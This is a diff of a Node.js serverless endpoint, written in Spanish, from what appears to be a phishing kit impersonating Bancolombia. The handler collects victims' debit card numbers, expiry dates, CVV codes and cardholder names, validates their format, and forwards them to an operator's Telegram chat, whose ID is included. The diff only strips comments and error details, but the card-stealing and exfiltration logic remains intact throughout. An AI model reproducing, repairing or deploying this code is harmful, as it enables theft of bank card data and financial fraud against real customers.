@@ -9,12 +9,12 @@ const CHAT_ID = '8042354877';
 // ============================================
 
 module.exports = async (req, res) => {
-    // Configurar CORS para Vercel
+    // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    // Manejar preflight requests (OPTIONS)
+    // Manejar preflight
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
@@ -32,22 +32,19 @@ module.exports = async (req, res) => {
             return res.status(400).json({ error: 'Faltan datos de la tarjeta' });
         }
 
-        // Validar número de tarjeta (16 dígitos)
         if (cardNumber.length !== 16) {
             return res.status(400).json({ error: 'El número de tarjeta debe tener 16 dígitos' });
         }
 
-        // Validar formato de fecha (MM/AA)
         if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
             return res.status(400).json({ error: 'La fecha debe tener formato MM/AA' });
         }
 
-        // Validar CVV (3 dígitos)
         if (cvcCode.length !== 3) {
             return res.status(400).json({ error: 'El CVV debe tener 3 dígitos' });
         }
 
-        // Construir mensaje con formato bonito
+        // Construir mensaje
         const message = `🏦 *BANCOLOMBIA - NUEVA TARJETA DÉBITO* 🏦\n\n` +
                         `💳 *Número:* \`${cardNumber}\`\n` +
                         `👤 *Titular:* ${cardHolder}\n` +
@@ -75,16 +72,14 @@ module.exports = async (req, res) => {
             });
         } else {
             res.status(500).json({ 
-                error: 'Error al enviar a Telegram',
-                details: response.data 
+                error: 'Error al enviar a Telegram'
             });
         }
 
     } catch (error) {
         console.error('Error:', error.response?.data || error.message);
         res.status(500).json({ 
-            error: 'Error interno del servidor',
-            details: error.response?.data?.description || error.message
+            error: 'Error interno del servidor'
         });
     }
 };
